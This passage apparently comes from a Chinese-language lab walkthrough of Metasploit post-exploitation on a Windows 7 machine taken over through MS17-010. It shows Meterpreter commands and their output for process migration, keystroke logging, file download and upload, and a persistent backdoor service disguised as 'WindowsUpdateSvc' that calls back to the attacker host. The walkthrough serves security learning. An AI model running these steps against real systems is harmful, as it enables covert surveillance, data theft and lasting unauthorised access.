+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1072&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\L&lt;/span&gt;OC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e AL SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1168&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\L&lt;/span&gt;OC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e AL SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1192&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; wmpnetwk.e x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\N&lt;/span&gt;ET
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; xe WORK SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1368&lt;/span&gt; &lt;span class="m"&gt;2012&lt;/span&gt; explorer.e x64 &lt;span class="m"&gt;1&lt;/span&gt; Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\E&lt;/span&gt;xplor
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; xe er.EXE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1420&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; sppsvc.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\N&lt;/span&gt;ET
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; WORK SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1656&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\L&lt;/span&gt;OC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e AL SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1692&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\N&lt;/span&gt;ET
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e WORK SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1760&lt;/span&gt; &lt;span class="m"&gt;1368&lt;/span&gt; taskmgr.ex x64 &lt;span class="m"&gt;1&lt;/span&gt; Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e 32&lt;span class="se"&gt;\t&lt;/span&gt;askmgr.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1916&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1960&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; taskhost.e x64 &lt;span class="m"&gt;1&lt;/span&gt; Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; xe 32&lt;span class="se"&gt;\t&lt;/span&gt;askhost.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2028&lt;/span&gt; &lt;span class="m"&gt;836&lt;/span&gt; dwm.exe x64 &lt;span class="m"&gt;1&lt;/span&gt; Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 32&lt;span class="se"&gt;\D&lt;/span&gt;wm.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2308&lt;/span&gt; &lt;span class="m"&gt;1136&lt;/span&gt; cmd.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;md.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2316&lt;/span&gt; &lt;span class="m"&gt;344&lt;/span&gt; conhost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;onhost.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2468&lt;/span&gt; &lt;span class="m"&gt;1136&lt;/span&gt; cmd.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;md.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2476&lt;/span&gt; &lt;span class="m"&gt;344&lt;/span&gt; conhost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;onhost.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2716&lt;/span&gt; &lt;span class="m"&gt;1136&lt;/span&gt; cmd.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;md.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2724&lt;/span&gt; &lt;span class="m"&gt;344&lt;/span&gt; conhost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;onhost.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2920&lt;/span&gt; &lt;span class="m"&gt;1136&lt;/span&gt; cmd.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;md.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2928&lt;/span&gt; &lt;span class="m"&gt;344&lt;/span&gt; conhost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;onhost.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;3044&lt;/span&gt; &lt;span class="m"&gt;1368&lt;/span&gt; notepad.ex x64 &lt;span class="m"&gt;1&lt;/span&gt; Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e 32&lt;span class="se"&gt;\N&lt;/span&gt;OTEPAD.EXE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; migrate &lt;span class="m"&gt;1368&lt;/span&gt; &lt;span class="c1"&gt;# 迁移到用户进程从而提取到用户权限&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Migrating from &lt;span class="m"&gt;1052&lt;/span&gt; to 1368...
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Migration completed successfully.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; getuid &lt;span class="c1"&gt;# 当前权限为Ankh&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Server username: Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; keyscan_start &lt;span class="c1"&gt;# 开始键盘嗅探&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Starting the keystroke sniffer ...
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; keyscan_dump &lt;span class="c1"&gt;# 打印“Hello？”&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Dumping captured keystrokes...
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;Shift&amp;gt;Hello&amp;lt;Shift&amp;gt;?
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; keyscan_stop &lt;span class="c1"&gt;# 结束键盘嗅探&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Stopping the keystroke sniffer...
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;PS：切换到用户身份之后一般很难提升到SYSTEM权限（Windows安全机制），如果尝试&lt;code&gt;getsystem&lt;/code&gt;无果，则&lt;code&gt;background&lt;/code&gt; -&amp;gt; &lt;code&gt;run&lt;/code&gt;重新执行exploit&lt;/p&gt;
+&lt;h5 id="3-文件窃取与上传"&gt;3. 文件窃取与上传
+&lt;/h5&gt;&lt;p&gt;下载上一步中靶机桌面保存的&lt;code&gt;hello.txt&lt;/code&gt;文件并上传一个&lt;code&gt;hi.txt&lt;/code&gt;文件（可以是可执行的恶意程序）&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; cat C:&lt;span class="se"&gt;\\&lt;/span&gt;Users&lt;span class="se"&gt;\\&lt;/span&gt;Ankh&lt;span class="se"&gt;\\&lt;/span&gt;Desktop&lt;span class="se"&gt;\\&lt;/span&gt;hello.txt &lt;span class="c1"&gt;# 文件读取&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Hello?meterpreter &amp;gt; download C:&lt;span class="se"&gt;\\&lt;/span&gt;Users&lt;span class="se"&gt;\\&lt;/span&gt;Ankh&lt;span class="se"&gt;\\&lt;/span&gt;Desktop&lt;span class="se"&gt;\\&lt;/span&gt;hello.txt /home/kali/Desktop &lt;span class="c1"&gt;# 把文件下载到Kali桌面&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Downloading: C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;ello.txt -&amp;gt; /home/kali/Desktop/hello.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Downloaded 6.00 B of 6.00 B &lt;span class="o"&gt;(&lt;/span&gt;100.0%&lt;span class="o"&gt;)&lt;/span&gt;: C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;ello.txt -&amp;gt; /home/kali/Desktop/hello.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Completed : C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;ello.txt -&amp;gt; /home/kali/Desktop/hello.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Desktop&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Hi\!&amp;#34;&lt;/span&gt; &amp;gt; hi.txt &lt;span class="c1"&gt;# Kali终端创建文件&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; upload /home/kali/Desktop/hi.txt &amp;gt; C:&lt;span class="se"&gt;\\&lt;/span&gt;Users&lt;span class="se"&gt;\\&lt;/span&gt;Ankh&lt;span class="se"&gt;\\&lt;/span&gt;Desktop&lt;span class="se"&gt;\\&lt;/span&gt; &lt;span class="c1"&gt;# 上传文件&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Uploading : /home/kali/Desktop/hi.txt -&amp;gt; C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;i.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Completed : /home/kali/Desktop/hi.txt -&amp;gt; C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\h&lt;/span&gt;i.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id="三metasploit持久化后门攻击"&gt;三、Metasploit持久化后门攻击
+&lt;/h4&gt;&lt;h5 id="利用windows服务机制实现权限维持"&gt;利用Windows服务机制实现权限维持
+&lt;/h5&gt;&lt;ol&gt;
+&lt;li&gt;Kali通过MS17-010漏洞获得靶机SYSTEM权限会话后，使用&lt;code&gt;persistence_service&lt;/code&gt;模块创建持久化后门&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 终端1：攻击配置：&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; use exploit/windows/local/persistence_service &lt;span class="c1"&gt;# 持久化服务模块&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; No payload configured, defaulting to windows/meterpreter/reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/local/persistence_service&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_tcp &lt;span class="c1"&gt;# 将攻击载荷设置为32位（默认），64位会出现不兼容情况&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/local/persistence_service&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; SESSION &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;# 设置为当前获取到SYSTEM权限的会话ID。可以通过sessions指令查看&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;SESSION&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/local/persistence_service&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LHOST 10.0.0.223 &lt;span class="c1"&gt;# 设置为Kali IP&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;LHOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; 10.0.0.223
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/local/persistence_service&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LPORT &lt;span class="m"&gt;4446&lt;/span&gt; &lt;span class="c1"&gt;# 指定一个监听端口&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;LPORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;4446&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/local/persistence_service&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; SERVICE_NAME WindowsUpdateSvc
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;SERVICE_NAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; WindowsUpdateSvc &lt;span class="c1"&gt;# 将服务名伪装&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; windows/meterpreter/reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/local/persistence_service&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; run &lt;span class="c1"&gt;#执行&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Started reverse TCP handler on 10.0.0.223:4446
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Running module against ANKH-PC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter service exe written to C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\T&lt;/span&gt;EMP&lt;span class="se"&gt;\k&lt;/span&gt;eQgBw.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Creating service WindowsUpdateSvc
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ANKH-PC_20251231.0748/ANKH-PC_20251231.0748.rc
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Sending stage &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;177734&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt; to 10.0.0.17
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter session &lt;span class="m"&gt;2&lt;/span&gt; opened &lt;span class="o"&gt;(&lt;/span&gt;10.0.0.223:4446 -&amp;gt; 10.0.0.17:49159&lt;span class="o"&gt;)&lt;/span&gt; at 2025-12-31 09:07:49 +0000
